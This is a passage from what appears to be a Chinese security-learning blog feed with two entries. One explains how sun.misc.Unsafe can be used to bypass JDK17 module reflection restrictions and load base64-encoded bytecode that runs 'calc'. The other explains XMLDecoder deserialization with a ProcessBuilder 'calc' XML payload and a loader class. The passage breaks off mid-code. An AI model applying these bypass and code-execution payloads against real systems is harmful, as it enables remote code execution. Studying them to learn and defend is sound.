    <content type="html"><![CDATA[<h1 id="jdk17反射限制"><a href="#JDK17反射限制" class="headerlink" title="JDK17反射限制"></a>JDK17反射限制</h1><p>在JDK9至JDK16版本之中，Java.*依赖包下所有的非公共字段和方法在进行反射调用的时候，会出现关于非法反射访问的警告，但是在JDK17之后，采用的是强封装，默认情况下不再允许这一类的反射，所有反射访问<strong>java.*的非公共字段和方法</strong>的代码将抛出InaccessibleObjectException异常</p><p>比如下面获取ClassLoader的protected的defineClass方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>会报这样的错误</p><p><img src="https://cdn.clown2024.cn/image-20241030111739224.png" alt="image-20241030111739224"></p><h2 id="jdk模块化限制"><a href="#JDK模块化限制" class="headerlink" title="JDK模块化限制"></a>JDK模块化限制</h2><p>为什么会这样被限制呢，这是由于在JDK9之后引入的模块化机制，指Java平台模块系统（Java Platform Module System，简称JPMS）</p><p>模块化机制的一些关键概念(由kimi生成)：</p><ul><li><strong>模块（Module）</strong>：一个模块是一组相关的包的集合，这些包一起提供特定的功能。</li><li><strong>模块化路径（Module Path）</strong>：模块化路径是类路径的替代品，用于指定模块的位置。</li><li><strong>模块描述符（Module Descriptor）</strong>：一个模块的配置文件，通常名为<code>module-info.class</code>，它定义了模块的名称、所需的依赖、提供的服务以及对其他模块的依赖。</li><li><strong>requires</strong>：在模块描述符中声明模块依赖，指定当前模块需要哪些其他模块。</li><li><strong>exports</strong>：声明模块中的哪些包是可供其他模块使用的。</li><li><strong>opens</strong>：声明模块中的哪些包是可供其他模块通过反射访问的。</li><li><strong>uses</strong>：声明模块需要使用哪个服务提供者。</li><li><strong>provides</strong>：声明模块提供了哪些服务实现。</li><li><strong>transitive</strong>：依赖关系的传递性，即如果模块A依赖模块B，而模块B又依赖模块C，那么模块A也隐式地依赖模块C。</li></ul><p>这些也可以去看一看JDK9的官方新特性说明：<a href="https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6">https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6</a></p><p>我们可以看看jdk17的jar包</p><p><img src="https://cdn.clown2024.cn/image-20241030130830178.png" alt="image-20241030130830178"></p><p>可以看到他的每个模块都是有module-info.class文件的</p><p>在JDK9新增了模块化服务之后，public、protected等访问权限修饰符就只在自己的模块里面生效，想在模块外被识别的话就需要使用exports关键字来导出</p><p>可以看看java本身的文件是怎么写的</p><p><img src="https://cdn.clown2024.cn/image-20241030132815410.png" alt="image-20241030132815410"></p><p>可以看到有很多常见类的导出，所以这些常见类平时才能被我们识别</p><p>而能否被反射访问是通过opens指令来定义的，我们可以随便找一个有opens指令的class文件来看看</p><p>比如这个</p><p><img src="https://cdn.clown2024.cn/image-20241030133237491.png" alt="image-20241030133237491"></p><p>这个的意思就是指定某些特定的模块才能在运行时对该模块下特定包下的类进行反射操作，to 后面跟模块名称。</p><p>只有opens <packeage>表示对所有模块开放反射</packeage></p><p>前面的模块中并没有对java.lang等等的class进行开放，所以我们也就无法反射获取其非public的字段和方法</p><h1 id="unsafe绕过"><a href="#Unsafe绕过" class="headerlink" title="Unsafe绕过"></a>Unsafe绕过</h1><h2 id="unsafe介绍"><a href="#Unsafe介绍" class="headerlink" title="Unsafe介绍"></a>Unsafe介绍</h2><p>Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。</p><p>sun.misc和sun.reflect包下的我们是可以正常反射的，所以我们就可以利用到这个类，可以在源码中看到</p><p><img src="https://cdn.clown2024.cn/image-20241030134455456.png" alt="image-20241030134455456"></p><p>有关Unsafe类的更详细介绍参考这篇文章：<a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p><p>在JDK17前Unsafe是有两个方法可以进行字节码的加载</p><p>在JDK11之前<code>defineClass</code>和<code>defineAnonymousClass</code>两种方法可以加载字节码，到JDK11就只剩下<code>defineAnonymousClass</code>一种方法，在JDK17之后这两种方法就都被移除了</p><p>所以JDK17前可以用下面这种方式来进行反射类的加载</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>unsafe.defineAnonymousClass(Class.class,bytes,<span class="hljs-literal">null</span>).newInstance();<br></code></pre></td></tr></table></figure><p>反射获取theUnsafe字段是因为该字段是单例模式</p><p><img src="https://cdn.clown2024.cn/image-20241030135005733.png" alt="image-20241030135005733"></p><p>不过也有静态方法来获取Unsafe实例，同样是返回theUnsafe字段的值</p><p><img src="https://cdn.clown2024.cn/image-20241030135048330.png" alt="image-20241030135048330"></p><h2 id="jdk17unsafe绕过"><a href="#JDK17Unsafe绕过" class="headerlink" title="JDK17Unsafe绕过"></a>JDK17Unsafe绕过</h2><p>那么JDK17之后我们要怎么绕过呢？</p><p>我们反射调用非public的字段或方法时，java是在setAccessiable方法执行的时候抛出异常的，我们可以去看一下他异常抛出逻辑，直接根据报错的调用栈去看</p><p><img src="https://cdn.clown2024.cn/image-20241030135950313.png" alt="image-20241030135950313"></p><p>首先他会走到checkCanSetAccessible方法，从意思上也知道，就是检查能否设置权限的方法</p><p><img src="https://cdn.clown2024.cn/image-20241030140555749.png" alt="image-20241030140555749"></p><p>然后一路走到这里具体的判断逻辑在这，这里或获取反射目标的module和调用的类的module，然后判断他们是否为同一个module，或者是否为Object.class的module，Object.class的module就是<strong>java.base</strong>，再或者就是目标模块未定义模块名</p><p>后面还有一些相关的判断，但我们需要绕过的就是这一部分就不再分析了</p><p>看到这里我们也能知道我们的绕过思路是什么，就是修改当前类的Module和要反射修改的类的module一致即可</p><p>而Unsafe类就提供了这样的方法来修改module是我们绕过检查，就是通过修改偏移量，将我们的类的module修改成基础module</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Test;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException, InstantiationException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(payload);<br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//获取Unsafe实例</span><br>        <span class="hljs-comment">//获取ClassLoader的module</span><br>        Module baseModule=Object.class.getModule();<br><br>        Class&lt;?&gt; currentClass= Bypass.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule); <span class="hljs-comment">//更改当前运行类的Module</span><br>        <span class="hljs-comment">//现在就能正常反射了</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; calc= (Class&lt;?&gt;) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;attack&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030142827432.png" alt="image-20241030142827432"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq+fbD">https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq%2BfbD</a></p><p><a href="https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx+xCwo4mhexcirc7=WoD">https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx%2BxCwo4mhexcirc7%3DWoD</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jdk17反射限制&quot;&gt;&lt;a href=&quot;#JDK17反射限制&quot; class=&quot;headerlink&quot; title=&quot;JDK17反射限制&quot;&gt;&lt;/a&gt;JDK17反射限制&lt;/h1&gt;&lt;p&gt;在JDK9至JDK16版本之中，Java.*依赖包下所有的非公共字段和方法在进行反射</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XML反序列化学习</title>
    <link href="https://clowsman.github.io/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-24T17:24:18.000Z</published>
    <updated>2024-10-25T18:27:56.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xmldecoder介绍"><a href="#XMLDecoder介绍" class="headerlink" title="XMLDecoder介绍"></a>XMLDecoder介绍</h1><p>XMLDecoder是java自带的以SAX方式解析xml的类，其在反序列化经过特殊构造的数据时可执行任意命令。</p><p>所谓的解析就是在java对象和xml文件之间的转化。</p><h2 id="sax是什么"><a href="#SAX是什么" class="headerlink" title="SAX是什么"></a>SAX是什么</h2><p>SAX全称为<code>Simple API for XML</code>，在Java中有两种原生解析xml的方式，分别是SAX和DOM。两者区别在于：</p><ol><li>Dom解析功能强大，可增删改查，操作时会将xml文档以文档对象的方式读取到内存中，因此适用于小文档</li><li>Sax解析是从头到尾逐行逐个元素读取内容，修改较为不便，但适用于只读的大文档</li></ol><p>SAX采用事件驱动的形式来解析xml文档，简单来讲就是触发了事件就去做事件对应的回调方法。</p><p>在SAX中，读取到文档开头、结尾，元素的开头和结尾以及编码转换等操作时会触发一些回调方法，你可以在这些回调方法中进行相应事件处理：</p><ul><li>startDocument()</li><li>endDocument()</li><li>startElement()</li><li>endElement()</li><li>characters()</li></ul><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><p>一个简单的pojo类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello, my name is &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>操作类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.beans.XMLEncoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-comment">// 序列化对象到文件person.xml</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlEncode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">18</span>);<br>        person.setName(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">XMLEncoder</span> <span class="hljs-variable">xmlEncoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        xmlEncoder.writeObject(person);<br>        xmlEncoder.close();<br>        System.out.println(<span class="hljs-string">&quot;序列化结束！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlDecode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)xmlDecoder.readObject();<br>        xmlDecoder.close();<br>        person.sayHello();<br>        System.out.println(person.getAge());<br>        System.out.println(person.getName());<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Demo1</span> <span class="hljs-variable">xmlTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>        xmlTest.xmlEncode();<br>        xmlTest.xmlDecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241025133812826.png" alt="image-20241025133812826"></p><p>序列化后的xml结构</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.8.0_65&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.XMLTest.Person&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于sax的xml解析"><a href="#基于SAX的XML解析" class="headerlink" title="基于SAX的XML解析"></a>基于SAX的XML解析</h2><p>接下来自己写一个基于SAX的xml解析</p><p>我们只要跟一下源码就可以发现它实现SAX形式是继承DefaultHandler类的，该类在org.xml.sax.helpers包下</p><p><img src="https://cdn.clown2024.cn/image-20241025135348967.png" alt="image-20241025135348967"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> org.xml.sax.Attributes;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><span class="hljs-keyword">import</span> org.xml.sax.helpers.DefaultHandler;<br><br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParser;<br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParserFactory;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DefaultHandler</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">saxParserFactory</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> saxParserFactory.newSAXParser();<br>            <span class="hljs-type">Demo2</span> <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo2</span>();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;person.xml&quot;</span>;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>            parser.parse(file, dh);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">characters</span><span class="hljs-params">(<span class="hljs-type">char</span>[] ch, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;characters()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.characters(ch, start, length);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.startDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.endDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startElement</span><span class="hljs-params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startElement()&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; attributes.getLength(); i++) &#123;<br>            <span class="hljs-comment">// getQName()是获取属性名称，</span><br>            System.out.println(attributes.getQName(i) + <span class="hljs-string">&quot;=&quot;</span> + attributes.getValue(i));<br>        &#125;<br>        <span class="hljs-built_in">super</span>.startElement(uri, localName, qName, attributes);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endElement</span><span class="hljs-params">(String uri, String localName, String qName)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endElement()&quot;</span>);<br>        System.out.println(uri + localName + qName);<br>        <span class="hljs-built_in">super</span>.endElement(uri, localName, qName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后解析前面的person.xml，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">startDocument()<br>startElement()<br>version=1.8.0_65<br>class=java.beans.XMLDecoder<br>characters()<br>startElement()<br>class=org.example.XMLTest.Person<br>characters()<br>startElement()<br>property=age<br>characters()<br>startElement()<br>characters()<br>endElement()<br>int<br>characters()<br>endElement()<br>void<br>characters()<br>startElement()<br>property=name<br>characters()<br>startElement()<br>characters()<br>endElement()<br>string<br>characters()<br>endElement()<br>void<br>characters()<br>endElement()<br>object<br>characters()<br>endElement()<br>java<br>endDocument()<br></code></pre></td></tr></table></figure><p>可以知道我们可以通过继承SAX的DefaultHandler类，重写其事件方法，就能拿到XML对应的节点、属性和值。</p><p>XMLDecoder也是基于SAX实现的xml解析，不过他拿到节点、属性、值之后通过Expression创建对象及调用方法。</p><h1 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h1><p>概括来说，XMLDecoder产生漏洞的原因主要有以下几个关键因素：</p><ul><li>XMLDecoder是java自带的以SAX方式解析xml的类，其在反序列化经过特殊构造的XML数据可以覆盖对应Beans成员值，这给构造gadget产生了可能。</li><li>XMLDecoder使用反射来动态生成Beans，这给触发gadget产生了可能。</li></ul><p>以上两个条件同时都具备，使得XMLDecoder产生远程代码执行漏洞的攻击面。</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>这里用一个弹计算器的payload去分析一下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        File file=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;payload.xml&quot;</span>);<br>        FileInputStream fileInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        BufferedInputStream bufferedInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fileInputStream);<br>        XMLDecoder xmlDecoder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bufferedInputStream);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    